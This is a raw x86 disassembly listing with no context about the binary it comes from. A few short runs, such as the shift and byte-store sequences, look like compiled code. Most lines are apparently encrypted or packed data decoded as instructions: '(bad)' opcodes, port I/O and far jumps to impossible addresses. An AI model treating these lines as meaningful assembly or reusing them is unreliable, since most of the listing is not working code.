  404eac:	pop    ecx
  404ead:	push   ss
  404eae:	add    al,0x96
  404eb0:	push   cs
  404eb1:	js     0x404edd
  404eb3:	xor    DWORD PTR [edx+0x8],0xe2eb29c7
  404eba:	cmp    eax,0x23d88cae
  404ebf:	in     al,0xa2
  404ec1:	adc    ebp,edi
  404ec3:	out    0x58,eax
  404ec5:	sbb    al,0x4c
  404ec7:	cdq    
  404ec8:	xor    eax,edi
  404eca:	xor    edx,edx
  404ecc:	or     eax,edx
  404ece:	mov    cl,BYTE PTR [eax+ecx*1]
  404ed1:	mov    eax,DWORD PTR [ebp-0x34]
  404ed4:	or     BYTE PTR [eax],cl
  404ed6:	mov    eax,DWORD PTR [ebp-0x10]
  404ed9:	mov    ecx,DWORD PTR [ebp-0xc]
  404edc:	shrd   eax,ecx,0x2
  404ee0:	shr    ecx,0x2
  404ee3:	mov    ecx,DWORD PTR [ebp-0x10]
  404ee6:	mov    edx,DWORD PTR [ebp-0xc]
  404ee9:	xor    eax,edi
  404eeb:	shl    ecx,0x1e
  404eee:	xor    edx,edx
  404ef0:	or     eax,edx
  404ef2:	lea    eax,[ebp+eax*1-0x4]
  404ef6:	mov    DWORD PTR [ebp-0x34],eax
  404ef9:	mov    eax,DWORD PTR [ebp-0x10]
  404efc:	mov    ecx,DWORD PTR [ebp-0xc]
  404eff:	shrd   eax,ecx,0x2
  404f03:	shr    ecx,0x2
  404f06:	mov    ecx,DWORD PTR [ebp-0x10]
  404f09:	mov    edx,DWORD PTR [ebp-0xc]
  404f0c:	xor    eax,edi
  404f0e:	shl    ecx,0x1e
  404f11:	mov    ecx,DWORD PTR [ebp-0x14]
  404f14:	xor    edx,edx
  404f16:	or     eax,edx
  404f18:	mov    cl,BYTE PTR [eax+ecx*1]
  404f1b:	mov    eax,DWORD PTR [ebp-0x34]
  404f1e:	add    BYTE PTR [eax],cl
  404f20:	mov    eax,DWORD PTR [ebp-0x60]
  404f23:	mov    ecx,DWORD PTR [ebp-0x5c]
  404f26:	shrd   eax,ecx,0x2
  404f2a:	shr    ecx,0x2
  404f2d:	mov    ecx,DWORD PTR [ebp-0x60]
  404f30:	mov    edx,DWORD PTR [ebp-0x5c]
  404f33:	xor    eax,edi
  404f35:	xor    edx,edx
  404f37:	or     eax,edx
  404f39:	lea    eax,[ebp+eax*1-0x4]
  404f3d:	mov    DWORD PTR [ebp-0x34],eax
  404f40:	mov    eax,DWORD PTR [ebp-0x60]
  404f43:	shl    ecx,0x1e
  404f46:	mov    ecx,DWORD PTR [ebp-0x5c]
  404f49:	shrd   eax,ecx,0x2
  404f4d:	shr    ecx,0x2
  404f50:	mov    ecx,DWORD PTR [ebp-0x60]
  404f53:	mov    edx,DWORD PTR [ebp-0x5c]
  404f56:	xor    eax,edi
  404f58:	xor    edx,edx
  404f5a:	or     eax,edx
  404f5c:	mov    edx,DWORD PTR [ebp+0x14]
  404f5f:	shl    ecx,0x1e
  404f62:	mov    ecx,DWORD PTR [ebp-0x14]
  404f65:	mov    cl,BYTE PTR [eax+ecx*1]
  404f68:	mov    eax,DWORD PTR [ebp-0x34]
  404f6b:	or     BYTE PTR [eax],cl
  404f6d:	jmp    0x40530e
  404f72:	mov    DWORD PTR [edx],ecx
  404f74:	push   0xabac68c5
  404f79:	mov    al,BYTE PTR [edi+0x16920a40]
  404f7f:	idiv   al
  404f81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f82:	mov    esi,0xbdbebe11
  404f87:	les    edi,FWORD PTR [esi-0x62670842]
  404f8d:	xchg   ebx,eax
  404f8e:	push   ebp
  404f8f:	or     DWORD PTR [edx],ecx
  404f91:	add    cl,dh
  404f93:	push   esi
  404f94:	add    BYTE PTR [edi],bh
  404f96:	shr    DWORD PTR [edx+0x67],cl
  404f99:	jo     0x404f58
  404f9b:	lock push eax
  404f9d:	ins    DWORD PTR es:[edi],dx
  404f9e:	fsub   st,st(5)
  404fa0:	fldenv [esi+0x0]
  404fa3:	stos   DWORD PTR es:[edi],eax
  404fa4:	ins    BYTE PTR es:[edi],dx
  404fa5:	pop    ss
  404fa6:	push   ds
  404fa7:	mov    ecx,0x321abd6a
  404fac:	scas   eax,DWORD PTR es:[edi]
  404fad:	cmc    
  404fae:	and    esp,DWORD PTR [edx-0x63]
  404fb1:	dec    esi
  404fb2:	cmp    BYTE PTR [edx],0x3b
  404fb5:	(bad)  
  404fb7:	xchg   ebp,eax
  404fb8:	dec    ebp
  404fb9:	jle    0x404fd6
  404fbb:	and    edx,edx
  404fbd:	add    dh,BYTE PTR [ecx]
  404fbf:	mov    al,0xd9
  404fc1:	retf   0xcc3d
  404fc4:	mov    BYTE PTR [esi+0x3a],bh
  404fc7:	jb     0x404fe6
  404fc9:	ins    DWORD PTR es:[edi],dx
  404fca:	fs mov edi,0x53814da9
  404fd0:	push   ss
  404fd1:	sub    BYTE PTR [esi+edx*1],al
  404fd4:	jmp    0x5b0b:0x995c72d8
  404fdb:	mov    al,BYTE PTR [ebx]
  404fdd:	dec    sp
  404fdf:	push   ds
  404fe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fe1:	push   ss
  404fe2:	(bad)  
  404fe3:	adc    eax,0x93aea8cd
  404fe8:	lock ins DWORD PTR es:[edi],dx
  404fea:	xchg   ebx,eax
  404feb:	inc    ecx
  404fec:	xchg   edx,eax
  404fed:	cmc    
  404fee:	nop
  404fef:	mov    dl,al
  404ff1:	repnz push esi
  404ff3:	sahf   
  404ff4:	jmp    0xcd22:0x1731d24c
  404ffb:	mov    ah,0x5b
  404ffd:	neg    BYTE PTR [esi-0x3e1d6879]
  405003:	les    ecx,FWORD PTR [edx+0x57f56198]
  405009:	mov    esp,DWORD PTR [edx]
  40500b:	inc    esi
  40500c:	out    dx,eax
  40500d:	mov    edx,0x87e08f69
  405012:	dec    ebx
  405013:	push   es
  405014:	shl    BYTE PTR [ebp+0x5],1
  405017:	push   ds
  405018:	cmp    DWORD PTR [ecx+ebp*1-0x52],edi
  40501c:	in     al,dx
  40501d:	xlat   BYTE PTR ds:[ebx]
  40501e:	ins    BYTE PTR es:[edi],dx
  40501f:	pop    ds
  405020:	pop    ecx
  405021:	mov    ds:0x32b78d05,al
  405026:	mov    ch,0xdd
  405029:	mov    ch,0xe8
  40502b:	jmp    0xf2867cb4
  405030:	fiadd  DWORD PTR [esi]
  405032:	jb     0x405025
  405034:	les    ebp,FWORD PTR [edi+0x7dcece9d]
  40503a:	and    al,0x7f
  40503c:	loop   0x40504a
  40503e:	rcl    BYTE PTR [eax+0x4574e133],cl
  405044:	jg     0x404fd2
  405046:	stos   BYTE PTR es:[edi],al
  405047:	sub    DWORD PTR [esi+ebx*2+0x603c5e0d],ebx
  40504e:	ds jmp 0xfa8fac00
  405054:	inc    edx
  405055:	add    eax,0x614ce055
  40505a:	mov    BYTE PTR [ecx-0x2d],bl
  40505d:	push   edi
  40505e:	popf   
  40505f:	adc    esi,DWORD PTR [ebx+0x2e]
  405062:	push   edx
  405063:	mov    ebp,0x283172a8
  405068:	ret    
  405069:	dec    ebx
  40506a:	sub    eax,0x26e64358
  40506f:	mov    cl,0x4
  405071:	int    0x9c
  405073:	add    DWORD PTR [eax+0xf],esi
  405076:	pop    esp
  405077:	jns    0x4050e9
  405079:	add    cl,ch
  40507b:	outs   dx,DWORD PTR ds:[esi]
  40507c:	rol    DWORD PTR [edi-0x19],cl
  40507f:	(bad)  
  405080:	push   0x2995203
  405085:	mov    BYTE PTR [bp+si],dl
  405088:	pop    es
  405089:	out    0x36,eax
  40508b:	mov    ch,0xa9
  40508d:	jae    0x405054
  40508f:	lea    ebx,[ecx-0x634f4d1c]
  405095:	sbb    DWORD PTR [edi+0x24],edx
  405098:	fcomp  QWORD PTR [edx+0x3c331991]
  40509e:	jne    0x4050f0
  4050a0:	inc    edx
  4050a1:	mov    bl,BYTE PTR [ecx+eax*1]
  4050a4:	icebp  
  4050a5:	jno    0x405111
  4050a7:	aad    0x99
  4050a9:	xchg   DWORD PTR [esi+ebx*1],ecx
  4050ac:	ret    
  4050ad:	inc    esi
  4050ae:	pop    ecx
  4050af:	add    al,0xb8
  4050b1:	sbb    al,0x57
  4050b3:	outs   dx,BYTE PTR ds:[esi]
  4050b4:	(bad)  
  4050b5:	cld    
  4050b6:	adc    dh,BYTE PTR [ebp+0x20a9d230]
  4050bc:	push   0xffffffde
  4050be:	(bad)  
  4050c0:	jns    0x4050c8
  4050c2:	push   ebp
  4050c3:	cli    
  4050c4:	jae    0x4050dc
  4050c6:	mov    bh,0xd5
  4050c8:	stc    
  4050c9:	nop
  4050ca:	push   eax
  4050cb:	or     ebp,edi
  4050cd:	sub    dh,BYTE PTR [edi-0x2d822359]
  4050d3:	repz inc esp
  4050d5:	aam    0xe4
  4050d7:	push   0xfffffff1
  4050d9:	xchg   ebx,eax
  4050da:	arpl   WORD PTR [eax],sp
  4050dc:	fld    st(7)
  4050de:	std    
  4050df:	and    al,bh
  4050e1:	push   cs
  4050e2:	push   ss
  4050e3:	das    
  4050e4:	inc    esp
  4050e5:	popa   
  4050e6:	jo     0x4050b6
  4050e8:	out    dx,al
  4050e9:	in     al,0x70
  4050eb:	push   DWORD PTR gs:[edx+0x1b185b1]
  4050f2:	sti    
  4050f3:	pop    ecx
  4050f4:	mov    bh,0x38
  4050f6:	jno    0x405163
  4050f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050f9:	retf   0x12e
  4050fc:	bound  edx,QWORD PTR [ecx+0x55c72ed7]
  405102:	fwait
  405103:	or     BYTE PTR [edx-0x45],0x6d
  405107:	div    ch
  405109:	xchg   ecx,eax
  40510a:	push   edi
  40510b:	or     BYTE PTR [edx],cl
  40510d:	test   eax,0xcf3952c5
  405112:	ins    WORD PTR es:[edi],dx
  405114:	inc    edi
  405115:	mov    edi,edi
  405117:	mov    ds:0xa1f2d070,al
  40511c:	xor    BYTE PTR [edx],0xc7
  40511f:	fiadd  DWORD PTR [ebp+0x4a]
  405122:	pop    ecx
  405123:	mov    ds:0xda7b936c,eax
  405128:	retf   
  405129:	inc    edx
  40512a:	ins    BYTE PTR es:[edi],dx
  40512b:	inc    ebp
  40512c:	fdivr  QWORD PTR [ebx-0x91b5a56]
  405132:	add    eax,0x40caf8c1
  405137:	xor    edx,esi
  405139:	mov    ah,0xe5
  40513b:	in     eax,0x2f
  40513d:	lods   al,BYTE PTR ds:[esi]
  40513e:	push   eax
  40513f:	repz push ss
  405141:	retf   
  405142:	jg     0x405104
  405144:	mov    ecx,0xe5df724
  405149:	out    0x5c,al
  40514b:	pop    ds
  40514c:	lods   al,BYTE PTR ds:[esi]
  40514d:	or     ch,cl
  40514f:	mov    esp,0xa2b9f01
  405154:	adc    al,0x65
  405156:	cmp    eax,0x84db5de1
  40515b:	pop    edi
  40515c:	inc    ecx
  40515d:	jne    0x405111
  40515f:	into   
  405160:	in     eax,dx
  405161:	dec    ecx
  405162:	and    BYTE PTR [ebp+ebp*4-0xbf4c151],ah
  405169:	add    eax,0xd9145713
  40516e:	(bad)
  405172:	dec    eax
  405173:	ss stc 
  405175:	mov    cl,0x3b
  405177:	loop   0x405157
  405179:	sbb    al,0xd2
  40517b:	jmp    0x4051d9
  40517d:	mov    esp,0x7b6ec2d7
  405182:	jno    0x4051ee
  405184:	mov    ds:0x3f5f7ea2,eax
  405189:	adc    edx,DWORD PTR ds:0xc1efed82
  40518f:	or     eax,edi
  405191:	outs   dx,DWORD PTR ds:[esi]
  405192:	aas    
  405193:	ins    BYTE PTR es:[edi],dx
  405194:	(bad)  
  405195:	jnp    0x405133
  405197:	fsubr  DWORD PTR [esi]
  405199:	push   ecx
  40519a:	add    al,0xd
  40519c:	hlt    
  40519d:	jp     0x405203
  40519f:	or     al,0x6a
  4051a1:	ds jp  0x4051d2
  4051a4:	push   0xf3ac8d76
  4051a9:	cdq    
  4051aa:	clc    
  4051ab:	(bad)  
  4051ac:	in     al,0x31
  4051ae:	xor    eax,0xac1d280a
  4051b3:	mov    eax,ds:0xe57a5fb
  4051b8:	cmp    BYTE PTR [eax+edi*8],dh
  4051bb:	lock adc eax,0x77f85113
  4051c1:	aas    
  4051c2:	mov    BYTE PTR [edx-0x4ebf6f69],dl
  4051c8:	xchg   esi,eax
  4051c9:	sub    ch,BYTE PTR [edi]
  4051cb:	shl    BYTE PTR [eax-0x22],cl
  4051ce:	clc    
  4051cf:	retf   0x31e6
  4051d2:	retf   0x454
  4051d5:	sahf   
  4051d6:	out    dx,al
  4051d7:	retf   
  4051d8:	sbb    eax,DWORD PTR [ebp+0x4c]
  4051db:	dec    esp
  4051dc:	jno    0x40522a
  4051de:	push   cs
  4051df:	sub    al,0xc2
  4051e1:	push   eax
  4051e2:	test   al,0xa
  4051e4:	mov    bl,0x16
  4051e6:	jge    0x405217
  4051e8:	sub    DWORD PTR [edi-0x4639efd5],ebp
  4051ee:	jge    0x40520c
  4051f0:	dec    esp
  4051f1:	das    
  4051f2:	les    edi,FWORD PTR [edi+0x63]
  4051f5:	jmp    0xa780:0x2c930d92
  4051fc:	(bad)  
  4051fd:	dec    ebp
  4051fe:	cwde   
  4051ff:	inc    edi
  405200:	mov    es,WORD PTR [esi]
  405202:	mov    BYTE PTR [esi-0x7ead3823],bh
  405208:	push   0x39
  40520a:	icebp  
  40520b:	mul    BYTE PTR [edi+0x2]
  40520e:	jg     0x4051bc
  405210:	push   edi
  405211:	add    eax,0xee2a26c3
  405216:	jnp    0x40521c
  405218:	jae    0x4051af
  40521a:	(bad)  
  40521b:	adc    esi,DWORD PTR [ecx]
  40521d:	add    dl,ah
  40521f:	mov    eax,ds:0x4dfa5a
  405224:	and    eax,DWORD PTR [edi]
  405226:	mov    ebp,0x2daf0b2a
  40522b:	aas    
  40522c:	call   0x835b282f
  405231:	or     eax,0x1afe411a
  405236:	and    BYTE PTR [edx+esi*1-0x7d],0x3b
  40523b:	cwde   
  40523c:	je     0x405257
  40523e:	(bad)  
  40523f:	es dec edx
  405241:	loop   0x405245
  405243:	mov    ds:0x53bcf3c3,al
  405248:	in     al,0x28
  40524a:	mov    dl,0x77
  40524c:	retf   0xe81
  40524f:	retf   
  405250:	push   edx
  405251:	scas   al,BYTE PTR es:[edi]
  405252:	mov    ah,0x6b
  405254:	outs   dx,BYTE PTR ds:[esi]
  405255:	(bad)  
  405257:	add    DWORD PTR ds:0xf79cb520,edx
  40525d:	iret   
  40525e:	and    edi,DWORD PTR [eax+0x4712b0e2]
  405264:	aam    0x61
  405266:	inc    edx
  405267:	jle    0x405214
  405269:	or     edi,eax
  40526b:	std    
  40526c:	mov    esp,0xf1f0b0a4
  405271:	and    al,0xba
  405273:	out    dx,eax
  405274:	cmp    al,0xe3
  405276:	enter  0x878e,0x10
  40527a:	push   ss
  40527b:	ret    0xb0ac
  40527e:	bound  edi,QWORD PTR [esp+edx*4+0x2b]
  405282:	lods   al,BYTE PTR ds:[esi]
  405283:	pop    DWORD PTR [ebp*2+0x192d87e9]
  40528a:	fidivr DWORD PTR [edi-0x418a5bcd]
  405290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405291:	pop    ebx
  405292:	pop    ecx
  405293:	jns    0x40530b
  405295:	xor    bh,bl
  405297:	test   BYTE PTR [edx+eiz*2],ah
  40529a:	fwait
  40529b:	shl    DWORD PTR [eax-0x7f],1
  40529e:	mov    esp,0x24b5a276
  4052a3:	dec    ecx
  4052a4:	repnz test dl,cl
  4052a7:	iret   
  4052a8:	cmp    al,BYTE PTR [ecx+0xef0b619]
  4052ae:	xor    ebx,ebp
  4052b0:	mov    bl,0xe8
  4052b2:	add    DWORD PTR [edi+0x64],edx
  4052b5:	xchg   edx,eax
  4052b6:	ficom  WORD PTR [eax]
  4052b8:	iret   
  4052b9:	or     ecx,ecx
  4052bb:	loop   0x4052ac
  4052bd:	repnz cs dec ebp
  4052c0:	push   ds
  4052c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052c2:	cmp    DWORD PTR [edx-0x7c6059fa],esi
  4052c8:	rol    BYTE PTR [edx],cl
  4052ca:	xor    BYTE PTR [ebp+0x7d],dl
  4052cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052ce:	lods   al,BYTE PTR ds:[esi]
  4052cf:	outs   dx,DWORD PTR ds:[esi]
  4052d0:	push   ebx
  4052d1:	bound  ebx,QWORD PTR [edi]
  4052d3:	cmp    BYTE PTR fs:[ecx+0x4d777845],ah
  4052da:	clc    
  4052db:	cwde   
  4052dc:	pop    edi
  4052dd:	int    0x5b
  4052df:	sub    BYTE PTR [edi-0x1b73d61d],ah
  4052e5:	pop    edi
  4052e6:	loop   0x4052d8
  4052e8:	fs ret 0xc677
  4052ec:	ret    
  4052ed:	cmp    WORD PTR [eax+eiz*1],sp
  4052f1:	dec    edi
  4052f2:	out    0xe2,eax
  4052f4:	dec    edx
  4052f5:	nop
  4052f6:	push   edx
  4052f7:	in     eax,dx
  4052f8:	ja     0x4052d6
  4052fa:	ret    0x6988
  4052fd:	dec    ebx
  4052fe:	ret    
  4052ff:	sbb    ecx,eax
  405301:	ficomp WORD PTR [ecx-0x754817bf]
  405307:	call   0x77f73295
  40530c:	cli    
  40530d:	std    
  40530e:	mov    eax,DWORD PTR [ebp+0x10]
  405311:	mov    ecx,eax
  405313:	shrd   ecx,edx,0x2
  405317:	shl    eax,0x1e
  40531a:	shr    edx,0x2
  40531d:	mov    DWORD PTR [ebp+0x14],edx
  405320:	mov    DWORD PTR [ebp+0x14],eax
  405323:	xor    edx,edx
  405325:	mov    eax,ecx
  405327:	jmp    0x4056c8
  40532c:	sub    eax,0x846700b2
  405331:	jnp    0x4052e9
  405333:	mov    esp,0xe3d964fe
  405338:	and    al,0x6c
  40533a:	pop    edx
  40533b:	sar    DWORD PTR [ebp-0x424141e9],1
  405341:	les    edi,FWORD PTR [esi+0x37407dbe]
  405347:	(bad)  
  405349:	stos   BYTE PTR es:[edi],al
  40534a:	and    ebx,DWORD PTR [ebp+0x540bbb67]
  405350:	(bad)  
  405351:	retf   0x8ba3
  405354:	ja     0x405308
  405356:	dec    ebx
  405357:	call   FWORD PTR [edi+0x3]
  40535a:	outs   dx,BYTE PTR ds:[esi]
  40535b:	sub    bl,bh
  40535d:	sub    eax,0xaf14945e
  405362:	mov    bl,0x4a
  405364:	hlt    
  405365:	push   edi
  405366:	or     ch,BYTE PTR [edi]
  405368:	rcr    BYTE PTR [ebp+0x2fa122f2],0x81
  40536f:	stos   DWORD PTR es:[edi],eax
  405370:	aad    0x2d
  405372:	jno    0x405321
  405374:	adc    al,0x8c
  405376:	mov    eax,0x484dcadd
  40537b:	frstor [ecx+0xc]
  40537e:	loopne 0x40534c
  405380:	daa    
  405381:	sub    ebp,DWORD PTR [eax+0xfbb1f5c]
  405387:	pop    ebx
  405388:	inc    ecx
  405389:	stos   DWORD PTR es:[edi],eax
  40538a:	outs   dx,DWORD PTR ds:[esi]
  40538b:	inc    ebx
  40538c:	jnp    0x405362
  40538e:	(bad)  
  40538f:	push   ss
  405390:	mov    cl,0xe3
  405392:	or     al,0x42
  405394:	test   BYTE PTR [ecx-0x42c7e0ea],ah
  40539a:	push   cs
  40539b:	cwde   
  40539c:	and    BYTE PTR [edx],bh
  40539e:	mov    ebx,0xdce5d8a4
  4053a3:	adc    eax,0xac88d140
  4053a8:	mov    eax,0xdfe33bc2
  4053ad:	jge    0x4053ee
  4053af:	xor    eax,0x52d545
  4053b4:	out    0x46,eax
  4053b6:	mov    bh,0x8a
  4053b8:	stc    
  4053b9:	push   ss
  4053ba:	in     eax,0x7c
  4053bc:	pop    ebp
  4053bd:	xchg   edi,eax
  4053be:	mov    esi,ebp
  4053c0:	retf   
  4053c1:	and    eax,0x4547b69
  4053c6:	ins    BYTE PTR es:[edi],dx
  4053c7:	scas   eax,DWORD PTR es:[edi]
  4053c8:	xor    eax,0x60cc9ade
  4053cd:	add    eax,0xe7622f58
  4053d2:	pushf  
  4053d3:	outs   dx,DWORD PTR ds:[esi]
  4053d4:	adc    al,0xf6
  4053d6:	push   0x592122cf
  4053db:	jae    0x405420
  4053dd:	pop    ebp
  4053de:	adc    eax,0xf45a6e5a
  4053e3:	lock dec edx
  4053e5:	jp     0x405465
  4053e7:	push   esp
  4053e8:	aam    0xf9
  4053ea:	clc    
  4053eb:	cmp    eax,0x83b83b80
  4053f0:	jnp    0x405383
  4053f2:	and    al,0xe
  4053f4:	ret    
  4053f5:	jnp    0x405439
  4053f7:	sub    edx,eax
  4053f9:	leave  
  4053fa:	mov    ebp,0x2b991e73
  4053ff:	mov    BYTE PTR [ecx],ch
  405401:	daa    
  405402:	push   ebp
  405403:	sub    cl,ch
  405405:	enter  0xf48b,0xe1
  405409:	cdq    
  40540a:	sbb    al,0x29
  40540c:	ficom  WORD PTR [edx+0x602ea59d]
  405412:	pop    ebx
  405414:	push   es
  405415:	pop    ds
  405416:	loopne 0x405452
  405418:	in     al,0x64
  40541a:	inc    esp
  40541b:	outs   dx,BYTE PTR ds:[esi]
  40541c:	dec    eax
  40541d:	jp     0x405408
  40541f:	jp     0x4053b5
  405421:	cmp    BYTE PTR [edi+0xdc3b3f8],ch
  405427:	aad    0x79
  405429:	out    0x5,eax
  40542b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40542c:	cmp    BYTE PTR [ebp-0x1d],bh
  40542f:	sbb    ebp,eax
  405431:	paddusb mm6,QWORD PTR [ebp-0xd937573]
  405438:	rcl    BYTE PTR [eax],1
  40543a:	nop    DWORD PTR [esi]
  40543d:	inc    eax
  40543e:	out    dx,eax
  40543f:	cmp    BYTE PTR [ecx+0x41d31e29],cl
  405445:	fisttp DWORD PTR [esi-0x2c]
  405448:	sahf   
  405449:	shrd   DWORD PTR [ecx-0x65a5e7b3],ecx,cl
  405450:	dec    esp
  405451:	jle    0x405402
  405453:	sbb    ecx,DWORD PTR [esi+eax*1+0x5c]
  405457:	into   
  405458:	xchg   edx,eax
  405459:	mov    ecx,ss
  40545b:	jns    0x40541b
  40545d:	je     0x40548e
  40545f:	mov    edx,0x8b204726
  405464:	mov    cl,0x36
  405466:	in     al,0xfe
  405468:	pusha  
  405469:	popa   
  40546a:	mov    DWORD PTR [edi+0x5a530183],ecx
  405470:	mov    ds:0x3ef4ba35,eax
  405475:	bound  esp,QWORD PTR ds:0x3f15e16e
  40547b:	add    DWORD PTR [ecx+0x51],0x45106658
  405482:	inc    ebp
  405483:	(bad)  
  405484:	cld    
  405485:	xchg   ebp,eax
  405486:	push   ss
  405487:	rol    BYTE PTR [ecx-0x73],cl
  40548a:	out    dx,eax
  40548b:	mov    edx,0xa53f9603
  405490:	dec    esi
  405491:	dec    edx
  405492:	stos   DWORD PTR es:[edi],eax
  405493:	dec    edi
  405494:	sub    ah,BYTE PTR [ebx]
  405496:	into   
  405497:	pushf  
  405498:	repnz addr16 inc ebx
  40549b:	jno    0x4054d1
  40549d:	jnp    0x4054cf
  40549f:	jno    0x40543c
  4054a1:	add    eax,0x168ffec4
  4054a6:	and    ah,BYTE PTR [ebp+esi*4-0x4ebe7505]
  4054ad:	dec    ebx
  4054ae:	iret   
  4054af:	(bad)  
  4054b0:	mul    BYTE PTR [eax-0x6d2a85b]
  4054b6:	shr    DWORD PTR [edx+0x6ad0f0c5],cl
  4054bc:	pop    eax
  4054bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054be:	mov    ah,0x95
  4054c0:	(bad)  
  4054c1:	pop    ds
  4054c2:	adc    eax,0x3c3ba7a2
  4054c7:	call   ebx
  4054c9:	out    0xd7,eax
  4054cb:	push   ebp
  4054cc:	push   es
  4054cd:	jae    0x4054c0
  4054cf:	cmp    al,0x7a
  4054d1:	sub    bh,bh
  4054d3:	inc    edi
  4054d4:	sbb    DWORD PTR [esi],ebp
  4054d6:	sub    eax,0x9e6ba809
  4054db:	cmc    
  4054dc:	inc    ebx
  4054dd:	lds    edx,FWORD PTR [ecx+eax*1+0xb]
  4054e1:	xchg   ah,ch
  4054e3:	pop    esp
  4054e4:	inc    eax
  4054e5:	cwde   
  4054e6:	scas   al,BYTE PTR es:[edi]
  4054e7:	push   0x2567a1da
  4054ec:	in     al,dx
  4054ed:	xchg   cl,ch
  4054ef:	(bad)  
  4054f0:	call   0x9e2af2cb
  4054f5:	xor    eax,DWORD PTR [ecx+0x52]
  4054f8:	or     eax,0xbe790557
  4054fd:	inc    si
  405500:	cmc    
  405501:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405502:	mov    bl,dl
  405504:	mov    WORD PTR [ecx],cs
  405506:	inc    eax
  405507:	ret    0x3935
  40550a:	(bad)  
  40550b:	(bad)  
  40550c:	cmc    
  40550d:	mov    BYTE PTR [ecx+ecx*8+0x7b],al
  405511:	ss aam 0xa2
  405514:	or     eax,0x7f74cfd4
  405519:	(bad)  [ecx-0x24f8b97a]
  40551f:	daa    
  405520:	out    dx,eax
  405521:	out    0x2f,al
  405523:	fnsave ds:0x21c5f40c
  405529:	inc    eax
  40552a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40552b:	dec    ecx
  40552c:	push   edi
  40552d:	jp     0x4054c8
  40552f:	or     DWORD PTR [edi-0x67],edx
  405532:	pop    esp
  405533:	mov    eax,0x83d388da
  405538:	aas    
  405539:	add    BYTE PTR [esi+ebp*2-0x58],al
  40553d:	in     al,0xb4
  40553f:	(bad)  
  405540:	in     eax,0xeb
  405542:	cmp    al,0xe6
  405544:	adc    dl,BYTE PTR [ebp+0x42]
  405547:	gs cld 
  405549:	lock in eax,dx
  40554b:	push   0x29
  40554d:	sbb    ah,bh
  40554f:	xchg   ecx,eax
  405550:	mov    bl,0xb0
  405552:	not    BYTE PTR [eax]
  405554:	jb     0x405543
  405556:	inc    edi
  405557:	mov    edx,0xafb9bde5
  40555c:	xchg   edx,eax
  40555d:	sbb    eax,0xd82644c0
  405562:	pop    esi
  405563:	add    edi,DWORD PTR [esi+ebp*4]
  405566:	cmp    dl,BYTE PTR [eax]
  405568:	retf   
  405569:	cs cli 
  40556b:	dec    eax
  40556c:	(bad)  
  40556d:	or     esi,DWORD PTR [esi+0x1e0d3adb]
  405573:	(bad)  
  405574:	mov    bl,BYTE PTR [edx+0x1a]
  405577:	loop   0x40554d
  405579:	iret   
  40557a:	jne    0x405579
  40557c:	stc    
  40557d:	xchg   ebx,eax
  40557e:	sbb    edi,edi
  405580:	and    BYTE PTR [eax+0x3d2a71b2],dl
  405586:	stos   BYTE PTR es:[edi],al
  405587:	jp     0x4055a4
  405589:	sti    
  40558a:	adc    edx,edi
  40558c:	cli    
  40558d:	xchg   edi,eax
  40558e:	add    DWORD PTR [ebx+0x14827b30],0x25
  405595:	jns    0x4055ba
  405597:	jmp    0x4055cd
  405599:	sub    DWORD PTR [ebx-0x70e35621],0x1c
  4055a0:	adc    bl,al
  4055a2:	or     al,0x99
  4055a4:	adc    eax,0x8e8ed2e1
  4055a9:	pop    edi
  4055aa:	bound  ecx,QWORD PTR [edx]
  4055ac:	cmp    eax,0x5713278c
  4055b1:	push   ecx
  4055b2:	addr16 sub eax,0x71cab6f0
  4055b8:	scas   al,BYTE PTR es:[edi]
  4055b9:	xor    ecx,DWORD PTR [ebx+eiz*1+0x6c33f056]
  4055c0:	ret    
  4055c1:	inc    ecx
  4055c2:	mov    bl,0x76
  4055c4:	adc    al,0xf3
  4055c6:	pop    eax
  4055c7:	fs cld 
  4055c9:	sbb    BYTE PTR ds:0x5e05041e,ch
  4055cf:	ficomp WORD PTR [ecx]
  4055d1:	xor    eax,0x89e4841b
  4055d6:	and    eax,DWORD PTR ds:0x64ca5e3f
  4055dc:	stos   DWORD PTR es:[edi],eax
  4055dd:	cmp    al,0x40
  4055df:	jl     0x4055df
  4055e1:	cmp    ecx,edi
  4055e3:	ins    BYTE PTR es:[edi],dx
  4055e4:	push   esp
  4055e5:	in     eax,dx
  4055e6:	sub    al,0xd6
  4055e8:	sahf   
  4055e9:	fsub   st,st(0)
  4055eb:	imul   cl
  4055ed:	icebp  
  4055ee:	data16 repnz adc al,0xd
  4055f2:	loope  0x40566d
  4055f4:	cmp    BYTE PTR [edx+0x61b8ace9],al
  4055fa:	inc    ecx
  4055fb:	xchg   BYTE PTR [edx-0x60],cl
  4055fe:	pop    edx
  4055ff:	pop    ebp
  405600:	into   
  405601:	adc    eax,0x9644ff07
  405606:	cmp    DWORD PTR [esi-0x1d8125d6],ecx
  40560c:	add    al,dl
  40560e:	mov    dh,BYTE PTR ds:0x7b321cf2
  405614:	dec    ebp
  405615:	(bad)  
  405616:	in     eax,0x99
  405618:	rol    DWORD PTR [ebx+0x4335a67],0xb2
  40561f:	call   0x772569a8
  405624:	jmp    0x4055fa
  405626:	jp     0x4055af
  405628:	pop    esi
  405629:	pusha  
  40562a:	sbb    dh,BYTE PTR [eax]
  40562c:	xchg   DWORD PTR [ebp+0x5b],edi
  40562f:	lea    esi,[ebx+0x4ded3ed5]
  405635:	jle    0x4056ac
  405637:	pop    esi
  405638:	pop    edx
  405639:	fadd   st,st(2)
  40563b:	push   0x6f98cf06
  405640:	xchg   ecx,eax
  405641:	ret    
  405642:	popf   
  405643:	mov    dl,0x6f
  405645:	ja     0x40565b
  405647:	stos   BYTE PTR es:[edi],al
  405648:	cld    
  405649:	sub    al,al
  40564b:	xchg   ebp,eax
  40564c:	aaa    
  40564d:	adc    esp,DWORD PTR [ecx-0x72619f74]
  405653:	jg     0x4056cd
  405655:	cmp    al,BYTE PTR [eax-0x4c]
  405658:	mov    al,ds:0x842dfa38
  40565d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40565e:	dec    ebx
  40565f:	out    0x8a,al
